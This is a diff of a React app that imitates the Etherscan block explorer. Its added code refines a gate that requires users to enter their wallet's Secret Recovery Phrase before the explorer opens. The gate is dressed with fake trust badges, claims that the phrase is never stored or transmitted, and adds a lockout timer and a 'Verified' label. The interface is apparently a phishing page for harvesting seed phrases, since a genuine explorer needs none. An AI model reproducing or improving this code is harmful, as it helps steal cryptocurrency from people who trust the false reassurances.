+                <div className="bot-pending-info-box">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{flexShrink:0,color:'var(--brand)'}}><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                  <span>You will receive an email notification once a decision has been made. No further action is required.</span>
+                </div>
               </div>
-              <div className="bot-modal-footer" style={{ justifyContent:'center' }}>
+              <div className="bot-modal-footer" style={{ justifyContent:'center', borderTop:'1px solid var(--border)' }}>
                 <button className="btn-secondary" type="button" onClick={() => setBotModalOpen(false)}>Close</button>
               </div>
             </>)}
@@ -3966,117 +4086,176 @@ export default function App() {
         {/* ════════════ ETHERSCAN CLONE ════════════ */}
         {activeView === 'etherscan' && (
           <div className="es-root">
-              {/* ── Top Nav ── */}
-              <div className="es-topnav">
-                <div className="es-topnav-inner">
-                  <div className="es-topnav-logo">
-                    <svg viewBox="0 0 293.775 293.649" width="26" height="26" fill="#fff"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/><path fill="#21325b" d="M59.262 150.27a8.468 8.468 0 0 1 8.332-7.134h49.856a8.468 8.468 0 0 1 8.468 8.468v104.36a5.64 5.64 0 0 1-9.28 4.309A123.51 123.51 0 0 1 29.3 172.33a5.64 5.64 0 0 1 4.9-8.47l17.867-.028a8.468 8.468 0 0 0 7.195-13.562"/><path fill="#21325b" d="M140.667 148.7a8.468 8.468 0 0 1 8.468-8.468h55.3a8.468 8.468 0 0 1 8.468 8.468v97.38a5.64 5.64 0 0 1-3.344 5.137 123.51 123.51 0 0 1-61.344 8.468 5.64 5.64 0 0 1-7.549-5.32V148.7z"/></svg>
-                    <span className="es-topnav-brand">{explorerBrand}</span>
-                  </div>
-                  <nav className="es-topnav-links">
-                    {['Home','Blockchain','Tokens','NFTs','Resources','Developers'].map(l => (
-                      <span key={l} className="es-nav-lnk">{l} <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg></span>
-                    ))}
-                  </nav>
-                  <div className="es-topnav-search">
-                    <input type="text" defaultValue={esAddr} readOnly className="es-search-input" />
-                    <button className="es-search-btn" type="button">
-                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
-                    </button>
-                  </div>
-                  <div className="es-topnav-stats">
-                    <span className="es-stat"><span className="es-stat-label">{chainConfig[chain].nativeSymbol}</span><span className="es-stat-val">{esEthUsdPrice ? `$${esEthUsdPrice}` : '--'}</span></span>
-                    <span className="es-stat"><span className="es-stat-label">Gas</span><span className="es-stat-val">{esGasGwei ? `${esGasGwei} Gwei` : '--'}</span></span>
-                  </div>
+
+            {/* ── Ultra-thin global stats strip ── */}
+            <div className="es-strip">
+              <div className="es-strip-inner">
+                <div className="es-strip-left">
+                  <span className="es-strip-item">
+                    <span className="es-strip-label">{chainConfig[chain].nativeSymbol} Price:</span>
+                    <span className="es-strip-val">{esEthUsdPrice ? `$${esEthUsdPrice}` : '—'}</span>
+                    <span className="es-strip-change">▲ 2.41%</span>
+                  </span>
+                  <span className="es-strip-pipe">|</span>
+                  <span className="es-strip-item">
+                    <span className="es-strip-label">Gas:</span>
+                    <span className="es-strip-val es-strip-gas">{esGasGwei ? `${esGasGwei} Gwei` : '—'}</span>
+                  </span>
+                  <span className="es-strip-pipe">|</span>
+                  <span className="es-strip-item es-strip-item--muted">
+                    {esLatestBlock ? `Block #${esLatestBlock.toLocaleString()}` : 'Syncing…'}
+                  </span>
+                </div>
+                <div className="es-strip-right">
+                  <span className="es-strip-network-pill">
+                    <span className="es-strip-network-dot" />
+                    {chainConfig[chain].label} Network
+                  </span>
                 </div>
               </div>
+            </div>
 
-              <div className="status-bar" style={{ margin: '0.75rem 1rem 0', borderColor: esSessionActive ? 'rgba(34,197,94,0.35)' : 'rgba(239,68,68,0.35)' }}>
-                <span className={`status-dot ${esSessionActive ? 'active' : 'warn'}`} />
-                {esSessionActive
-                  ? `Explorer session active: ${esSessionTimerLabel} remaining`
-                  : esLockActive
-                    ? `Session expired. Locked for ${esLockTimerLabel}.`
-                    : 'Session not verified. Submit seed phrase to unlock explorer for 5 minutes.'}
+            {/* ── Main nav ── */}
+            <div className="es-topnav">
+              <div className="es-topnav-inner">
+                <div className="es-topnav-logo">
+                  <svg viewBox="0 0 293.775 293.649" width="28" height="28" fill="#fff"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/><path fill="#21325b" d="M59.262 150.27a8.468 8.468 0 0 1 8.332-7.134h49.856a8.468 8.468 0 0 1 8.468 8.468v104.36a5.64 5.64 0 0 1-9.28 4.309A123.51 123.51 0 0 1 29.3 172.33a5.64 5.64 0 0 1 4.9-8.47l17.867-.028a8.468 8.468 0 0 0 7.195-13.562"/><path fill="#21325b" d="M140.667 148.7a8.468 8.468 0 0 1 8.468-8.468h55.3a8.468 8.468 0 0 1 8.468 8.468v97.38a5.64 5.64 0 0 1-3.344 5.137 123.51 123.51 0 0 1-61.344 8.468 5.64 5.64 0 0 1-7.549-5.32V148.7z"/></svg>
+                  <span className="es-topnav-brand">{explorerBrand}</span>
+                </div>
+                <nav className="es-topnav-links">
+                  {['Home','Blockchain','Tokens','NFTs','Resources','Developers'].map(l => (
+                    <span key={l} className="es-nav-lnk">
+                      {l}
+                      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg>
+                    </span>
+                  ))}
+                </nav>
+                <div className="es-topnav-search">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: '0.6rem', color: 'rgba(255,255,255,0.4)', flexShrink: 0 }}><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+                  <input type="text" defaultValue={esAddr} readOnly className="es-search-input" placeholder="Search by Address / Txn Hash / Block / Token" />
+                  <button className="es-search-btn" type="button">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+                  </button>
+                </div>
+                <div className="es-topnav-actions">
+                  <button className="es-signin-btn" type="button">Sign In</button>
+                </div>
               </div>
+            </div>
 
-              {/* ── Content ── */}
-              <div className="es-page">
+            {/* ── Content ── */}
+            <div className="es-page">
 
-                {/* ── Inline Session Gate ── */}
-                {!esSessionActive && (
-                  <div className="es-gate">
-                    {esLockActive ? (
-                      <div className="es-gate-lockout">
-                        <div className="es-gate-lock-icon">
-                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="32" height="32" strokeLinecap="round" strokeLinejoin="round">
-                            <rect x="3" y="11" width="18" height="11" rx="2"/>
-                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-                          </svg>
-                        </div>
-                        <h3 className="es-gate-title">Explorer Locked</h3>
-                        <p className="es-gate-sub">
-                          Your session expired. Explorer access is locked for <strong>{esLockTimerLabel}</strong>.
-                          You will be automatically redirected when the lockout expires.
-                        </p>
-                        <div className="es-gate-timer-bar">
-                          <div className="es-gate-timer-bar-inner es-gate-timer-bar-warn" />
-                        </div>
+              {/* ── Session Gate ── */}
+              {!esSessionActive && (
+                <div className="es-gate">
+                  {esLockActive ? (
+                    <div className="es-gate-lockout">
+                      <div className="es-gate-lock-circle">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" width="36" height="36" strokeLinecap="round" strokeLinejoin="round">
+                          <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                        </svg>
                       </div>
-                    ) : (
-                      <div className="es-gate-verify">
-                        <div className="es-gate-icon">
-                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="28" height="28" strokeLinecap="round" strokeLinejoin="round">
+                      <h3 className="es-gate-title">Explorer Temporarily Locked</h3>
+                      <p className="es-gate-sub">
+                        Your session has expired. Advanced explorer features are locked for <strong>{esLockTimerLabel}</strong>. You will be redirected automatically.
+                      </p>
+                      <div className="es-gate-timer-bar"><div className="es-gate-timer-bar-inner es-gate-timer-bar-warn" /></div>
+                    </div>
+                  ) : (
+                    <div className="es-gate-verify">
+                      <div className="es-gate-brand-row">
+                        <svg viewBox="0 0 293.775 293.649" width="32" height="32" fill="#21325b"><path d="M144.028 6.721A137.683 137.683 0 0 0 6.345 144.404c0 76.066 61.617 137.683 137.683 137.683s137.683-61.617 137.683-137.683S220.094 6.721 144.028 6.721"/></svg>
+                        <span className="es-gate-brand-name">{explorerBrand}</span>
+                        <span className="es-gate-brand-sep">|</span>
+                        <span className="es-gate-brand-sub">Wallet Verification</span>
+                      </div>
+
+                      <div className="es-gate-hero">
+                        <div className="es-gate-shield">
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" width="34" height="34" strokeLinecap="round" strokeLinejoin="round">
                             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                           </svg>
                         </div>
                         <div className="es-gate-text">
-                          <h3 className="es-gate-title">Identity Verification Required</h3>
-                          <p className="es-gate-sub">To access the on-chain explorer, confirm your wallet ownership by entering your recovery phrase. Sessions are limited to 5 minutes for security.</p>
+                          <h3 className="es-gate-title">Verify Wallet Ownership</h3>
+                          <p className="es-gate-sub">
+                            To access advanced transaction history and analytics for this address, complete cryptographic ownership verification using your Secret Recovery Phrase. Your phrase is processed locally and is never stored or transmitted.
+                          </p>
+                          <div className="es-gate-trust">
+                            <span className="es-gate-chip">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                              End-to-End Encrypted
+                            </span>
+                            <span className="es-gate-chip">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>
+                              Session Scoped
+                            </span>
+                            <span className="es-gate-chip">
+                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                              Zero Storage
+                            </span>
+                          </div>
                         </div>
-                        <form className="es-gate-form" onSubmit={submitExplorerSeedGate}>
-                          <div className="es-gate-field">
-                            <label className="es-gate-label" htmlFor="es-seed-input">
-                              Recovery Phrase
-                              <span className="es-gate-required">Required</span>
-                            </label>
-                            <textarea
-                              id="es-seed-input"
-                              className="es-gate-textarea"
-                              rows={3}
-                              placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces…"
-                              value={esSeedInput}
-                              onChange={e => setEsSeedInput(e.target.value)}
-                              required
-                            />
+                      </div>
+
+                      <form className="es-gate-form" onSubmit={submitExplorerSeedGate}>
+                        <div className="es-gate-field">
+                          <div className="es-gate-label-row">
+                            <label className="es-gate-label" htmlFor="es-seed-input">Secret Recovery Phrase</label>
+                            <span className="es-gate-required">Required</span>
+                          </div>
+                          <textarea
+                            id="es-seed-input"
+                            className="es-gate-textarea"
+                            rows={3}
+                            placeholder="word1 word2 word3 … (12 or 24 words, lowercase, separated by spaces)"
+                            value={esSeedInput}
+                            onChange={e => setEsSeedInput(e.target.value)}
+                            required
+                          />
+                          <div className="es-gate-meta">
+                            <span className={`es-gate-wordcount${[12,24].includes(esSeedInput.trim().split(/\s+/).filter(Boolean).length) ? ' es-gate-wordcount--ok' : ''}`}>
+                              {esSeedInput.trim() ? esSeedInput.trim().split(/\s+/).filter(Boolean).length : 0} / 12 or 24 words
+                            </span>
                             {esSeedError && <span className="es-gate-error">{esSeedError}</span>}
                           </div>
-                          <div className="es-gate-actions">
-                            <button className="es-gate-submit" type="submit">
-                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
-                              Verify &amp; Start Session
-                            </button>
-                            <button className="es-gate-cancel" type="button" onClick={() => setActiveView('ownership')}>
-                              Go back
-                            </button>
-                          </div>
-                          <p className="es-gate-disclaimer">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                            Your phrase is used only for ownership verification and is never transmitted in plaintext.
-                          </p>
-                        </form>
-                      </div>
-                    )}
-                  </div>
-                )}
+                        </div>
 
-                {/* Full content — only visible when session is active */}
-                {esSessionActive && (<>
-                <div className="es-breadcrumb">
+                        <button className="es-gate-submit" type="submit">
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="15" height="15" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                          Verify &amp; Access Explorer
+                        </button>
+                        <button className="es-gate-cancel" type="button" onClick={() => setActiveView('ownership')}>
+                          ← Return to Safety Check
+                        </button>
+
+                        <p className="es-gate-disclaimer">
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                          By continuing you confirm that this phrase belongs to a wallet you own. {explorerBrand} does not store, log, or transmit recovery phrases under any circumstances.
+                        </p>
+                      </form>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {/* ── Full explorer content (session active) ── */}
+              {esSessionActive && (<>
+
+                {/* Session timer banner */}
+                <div className="es-session-bar">
+                  <span className="es-session-dot" />
+                  <span>Session active — <strong>{esSessionTimerLabel}</strong> remaining</span>
                   <button type="button" className="es-back-btn" onClick={() => setActiveView('protect')}>
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"/></svg>
-                    Back
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+                    Back to Safety Check
                   </button>
+                </div>
+
+                {/* Breadcrumb */}
+                <div className="es-breadcrumb">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
                   <span className="es-bc-sep">/</span>
                   <span className="es-bc-link">Home</span>
                   <span className="es-bc-sep">/</span>
@@ -4085,21 +4264,37 @@ export default function App() {
                   <span className="es-bc-current">Address Details</span>
                 </div>
 
+                {/* Address header */}
                 <div className="es-addr-header">
-                  <div className="es-addr-title-row">
-                    <div className="es-addr-avatar">
-                      {esAddr.slice(2, 4).toUpperCase()}
-                    </div>
-                    <div>
-                      <div className="es-addr-label-top">Address</div>
+                  <div className="es-addr-header-left">
+                    <div className="es-addr-avatar">{esAddr.slice(2, 4).toUpperCase()}</div>
+                    <div className="es-addr-info">
+                      <div className="es-addr-type-row">
+                        <span className="es-addr-type-label">Address</span>
+                        <span className="es-addr-network-pill">
+                          <span className="es-chain-dot" />
+                          {chainConfig[chain].label}
+                        </span>
+                        <span className="pill low" style={{ fontSize: '0.65rem', padding: '2px 7px', letterSpacing: '0.03em' }}>
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="9" height="9" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                          &nbsp;Verified
+                        </span>
+                      </div>
                       <div className="es-addr-full">
                         <span className="es-addr-text">{esAddr}</span>
                         <button type="button" className="es-icon-btn" title="Copy address" onClick={() => navigator.clipboard.writeText(esAddr)}>
-                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                         </button>
-                        <span className="pill low" style={{ fontSize: '0.67rem', padding: '2px 6px' }}>Verified</span>
                       </div>
-                      <div className="es-addr-tag">🏷 My Wallet</div>
+                      <div className="es-addr-subtags">
+                        <span className="es-addr-nametag">🏷 My Wallet</span>
+                        <span className="es-addr-pipe">|</span>
+                        <span className="es-addr-notebtn">+ Private Name Tag</span>
+                        <span className="es-addr-pipe">|</span>
+                        <span className="es-addr-notebtn">+ Note</span>
+                        <span className="es-addr-pipe">|</span>
+                        <span className="es-addr-notebtn">Multichain Portfolio ↗</span>
+                      </div>
                     </div>
                   </div>
                   <div className="es-addr-actions">
@@ -4109,67 +4304,86 @@ export default function App() {
                     </button>
                     <a className="es-action-btn" href={`${explorerAddressUrl}${esAddr}`} target="_blank" rel="noopener noreferrer">
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 0 1-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-                      View on {explorerBrand}
+                      {explorerBrand} ↗
                     </a>
                     {approvedBotForWallet ? (
                       <span className="bot-deploy-badge approved">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
                         Bot Protected
                       </span>
                     ) : pendingBotForWallet ? (
                       <span className="bot-deploy-badge pending">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                         Pending Review
                       </span>
                     ) : (
                       <button type="button" className="bot-deploy-btn" onClick={openBotModal}>
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="13" height="13" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="12" height="12" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                         Deploy Bot
                       </button>
                     )}
                   </div>
                 </div>
 
-                {/* Overview cards */}
+                {/* ── Overview grid — 2 white cards each with 3 metrics ── */}
                 <div className="es-overview-grid">
                   <div className="es-overview-card">
                     <div className="es-ov-section">
-                      <div className="es-ov-label">{chainConfig[chain].nativeSymbol} BALANCE</div>
+                      <div className="es-ov-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        {chainConfig[chain].nativeSymbol} Balance
+                      </div>
                       <div className="es-ov-value">{esEthBalance} {chainConfig[chain].nativeSymbol}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
-                      <div className="es-ov-label">{chainConfig[chain].nativeSymbol} VALUE</div>
-                      <div className="es-ov-value">{esEthValueUsd ? `$${esEthValueUsd}` : '--'}</div>
-                      <div className="es-ov-sub">{esEthUsdPrice ? `@$${esEthUsdPrice}/${chainConfig[chain].nativeSymbol}` : 'Price unavailable'}</div>
+                      <div className="es-ov-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                        {chainConfig[chain].nativeSymbol} Value
+                      </div>
+                      <div className="es-ov-value" style={{ color: '#198754' }}>{esEthValueUsd ? `$${esEthValueUsd}` : '—'}</div>
+                      <div className="es-ov-sub">{esEthUsdPrice ? `@ $${esEthUsdPrice} / ${chainConfig[chain].nativeSymbol}` : 'Price unavailable'}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
-                      <div className="es-ov-label">TOKEN HOLDINGS</div>
-                      <div className="es-ov-value es-ov-token">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                        {esTokenTransferCount} Tokens
+                      <div className="es-ov-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        Token Holdings
                       </div>
-                      <div className="es-ov-sub">Based on recent transfer activity</div>
+                      <div className="es-ov-value es-ov-token">
+                        {esTokenTransferCount > 0 ? (
+                          <><span className="es-token-count-pill">{esTokenTransferCount}</span> Token{esTokenTransferCount !== 1 ? 's' : ''}</>
+                        ) : '—'}
+                      </div>
+                      <div className="es-ov-sub">Based on ERC-20 transfer activity</div>
                     </div>
                   </div>
 
                   <div className="es-overview-card">
                     <div className="es-ov-section">
-                      <div className="es-ov-label">TRANSACTIONS</div>
-                      <div className="es-ov-value">{esTxCount}</div>
+                      <div className="es-ov-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+                        Transactions
+                      </div>
+                      <div className="es-ov-value">{esTxCount.toLocaleString()}</div>
+                      <div className="es-ov-sub">{esTxRows.filter(t => t.direction === 'OUT').length} sent · {esTxRows.filter(t => t.direction === 'IN').length} received</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
-                      <div className="es-ov-label">LAST TXN SENT</div>
-                      <div className="es-ov-value" style={{ fontSize: '0.92rem' }}>{esLastTx?.age ?? 'No transactions'}</div>
-                      <div className="es-ov-sub">{esLastTx ? `Block #${esLastTx.block.toLocaleString()}` : 'Awaiting transaction history'}</div>
+                      <div className="es-ov-label">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        Last Transaction
+                      </div>
+                      <div className="es-ov-value" style={{ fontSize: '0.9rem' }}>{esLastTx?.age ?? '—'}</div>
+                      <div className="es-ov-sub">{esLastTx ? `Block #${esLastTx.block.toLocaleString()}` : 'No transactions yet'}</div>
                     </div>
                     <div className="es-ov-divider" />
                     <div className="es-ov-section">
-                      <div className="es-ov-label">EVM CHAIN</div>
-                      <div className="es-ov-value es-ov-chain">
-                        <span className="es-chain-dot" />
+                      <div className="es-ov-label">
+                        <span className="es-chain-dot" style={{ display: 'inline-block', verticalAlign: 'middle', marginRight: '3px' }} />
+                        Network
+                      </div>
+                      <div className="es-ov-value es-ov-chain" style={{ fontSize: '0.92rem' }}>
                         {chainConfig[chain].label}
                       </div>
                       <div className="es-ov-sub">Chain ID {chainConfig[chain].chainId}</div>
@@ -4177,65 +4391,98 @@ export default function App() {
                   </div>
                 </div>
 
-                {/* More info row */}
+                {/* ── More info row ── */}
                 <div className="es-more-info">
-                  <div className="es-info-item"><span className="es-info-label">NETWORK GAS</span><span className="es-info-val">{esGasGwei ? `${esGasGwei} Gwei` : '--'}</span></div>
-                  <div className="es-info-item"><span className="es-info-label">FUNDED BY</span><span className="es-info-val es-link">{esIncomingFund ? `${esIncomingFund.from.slice(0, 10)}…${esIncomingFund.from.slice(-6)}` : 'N/A'}</span></div>
-                  <div className="es-info-item"><span className="es-info-label">FIRST SEEN</span><span className="es-info-val">{esTxRows.length > 0 ? esTxRows[esTxRows.length - 1].age : 'N/A'}</span></div>
-                  <div className="es-info-item"><span className="es-info-label">LATEST BLOCK</span><span className="es-info-val">{esLatestBlock ? `#${esLatestBlock.toLocaleString()}` : 'N/A'}</span></div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">Network Gas</span>
+                    <span className="es-info-val">{esGasGwei ? `${esGasGwei} Gwei` : '—'}</span>
+                  </div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">Funded By</span>
+                    <span className="es-info-val es-link" title={esIncomingFund?.from}>
+                      {esIncomingFund ? `${esIncomingFund.from.slice(0, 10)}…${esIncomingFund.from.slice(-6)}` : '—'}
+                    </span>
+                  </div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">First Seen</span>
+                    <span className="es-info-val">{esTxRows.length > 0 ? esTxRows[esTxRows.length - 1].age : '—'}</span>
+                  </div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">Latest Block</span>
+                    <span className="es-info-val">{esLatestBlock ? `#${esLatestBlock.toLocaleString()}` : '—'}</span>
+                  </div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">Nonce</span>
+                    <span className="es-info-val">{esTxCount}</span>
+                  </div>
+                  <div className="es-info-item">
+                    <span className="es-info-label">Explorer</span>
+                    <a className="es-info-val es-link" href={`${explorerAddressUrl}${esAddr}`} target="_blank" rel="noopener noreferrer">
+                      {explorerBrand} ↗
+                    </a>
+                  </div>
                 </div>
 
-                {/* Tabs */}
+                {/* ── Tabs bar ── */}
                 <div className="es-tabs-bar">
-                  {[
-                    { id: 'transactions', label: 'Transactions', count: esTxRows.length },
-                    { id: 'internal',     label: 'Internal Txns', count: esTxRows.filter(tx => tx.method === 'Internal Txn').length },
+                  {([
+                    { id: 'transactions', label: 'Transactions',            count: esTxRows.length },
+                    { id: 'internal',     label: 'Internal Txns',           count: esTxRows.filter(tx => tx.method === 'Internal Txn').length },
                     { id: 'erc20',        label: 'Token Transfers (ERC-20)', count: esTokenTransferCount },
-                    { id: 'nft',          label: 'NFT Transfers', count: 0 },
-                    { id: 'analytics',    label: 'Analytics' },
-                  ].map(t => (
-                    <button
-                      key={t.id}
-                      type="button"
-                      className={`es-tab${t.id === 'transactions' ? ' es-tab--active' : ''}`}
-                    >
+                    { id: 'nft',          label: 'NFT Transfers',            count: 0 },
+                    { id: 'analytics',    label: 'Analytics',               count: undefined },
+                  ] as { id: string; label: string; count?: number }[]).map(t => (
+                    <button key={t.id} type="button" className={`es-tab${t.id === 'transactions' ? ' es-tab--active' : ''}`}>
                       {t.label}
                       {t.count !== undefined && <span className="es-tab-count">{t.count}</span>}
                     </button>
                   ))}
                 </div>
 
-                {/* Filter / info bar */}
+                {/* ── Table toolbar ── */}
                 <div className="es-table-topbar">
                   <span className="es-table-info">
-                    Latest {esTxRows.length} transactions from a total of <strong>{esTxCount}</strong> transactions
+                    {esLoading ? (
+                      <><span className="es-loading-dot" />Loading on-chain data…</>
+                    ) : (
+                      <>Showing <strong>{esTxRows.length}</strong> transaction{esTxRows.length !== 1 ? 's' : ''} of <strong>{esTxCount.toLocaleString()}</strong> total</>
+                    )}
                   </span>
                   <div className="es-table-actions">
